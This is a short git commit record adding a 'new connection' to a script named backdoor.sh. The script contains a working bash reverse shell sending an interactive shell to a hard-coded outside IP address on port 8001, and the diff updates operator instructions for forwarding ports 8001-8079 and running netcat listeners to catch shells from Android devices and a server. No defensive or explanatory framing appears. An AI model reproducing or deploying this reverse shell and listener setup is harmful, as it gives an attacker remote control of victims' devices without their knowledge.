f0652343c49838c6cf5b824643e567e1ac921008
Angel Diaz <angel.diaz@gmail.com>
2019-02-26 22:12:08 +0100

    add new connection

--- backdoor.sh
+++ backdoor.sh
@@ -6,6 +6,7 @@
 bash -i >& /dev/tcp/148.3.88.17/8001 0>&1
 
 # INSTRUCTIONS:
-# 1. Open port 8001 on your router and forward it to your device's local IP on the same port
+# 1. Open port 8001-8079 on your router and forward it to your device's local IP on the same port
 # 2. Listen on your computer using NetCat running:
-#    nc -lvv 0.0.0.0 -p 8001
+#    nc -lvv 0.0.0.0 -p 8001 (Android)
+#    nc -nlvv -p 8002 (Server)
